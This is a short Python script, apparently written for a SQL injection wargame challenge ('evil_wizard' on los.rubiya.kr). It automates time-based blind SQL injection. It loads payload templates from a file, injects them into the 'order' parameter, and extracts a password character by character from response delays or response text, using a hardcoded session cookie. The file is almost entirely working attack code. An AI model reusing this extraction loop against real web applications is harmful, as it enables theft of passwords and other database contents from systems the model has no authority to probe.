import string
import requests
import time
url = "https://los.rubiya.kr/chall/evil_wizard_32e3d35835aa4e039348712fb75169ad.php/"
session = requests.Session()
char = string.printable
header = {
    'Cookie' : "PHPSESSID=p9phs3kas3ep8ff1qv7q8mdo2a"
}
f1 = open("time-based.txt", "r")

p = "order"

f1 = open("time-based.txt", "r")
list=[]        
for ch in f1:                
    print(ch)
    list.append(ch)

user_ch = int(input("your choose : "))
col = input("column : ")
len_pw = int(input("length :"))
password = ""
s_p = input("Sepecial params : ")
sp = input("Sepecial change : ")
for i in range(1, len_pw):
    for j in char:
        start = time.time()
        pw = list[user_ch].replace("{pw}", s_p).replace("{i}", str(i)).replace("{j}", str(ord(j))).replace("\n", "").replace("{col}" , col)
        get = session.get(url=url, headers=header, params=f"{p}={pw[2:]}")            
        timing = time.time() - start
        print(timing)
        if timing > 2 or sp not in get.text:
            print(len(get.text), pw[2:], get.url)
            password = password + j
            print(password)
            break    

f1.close()
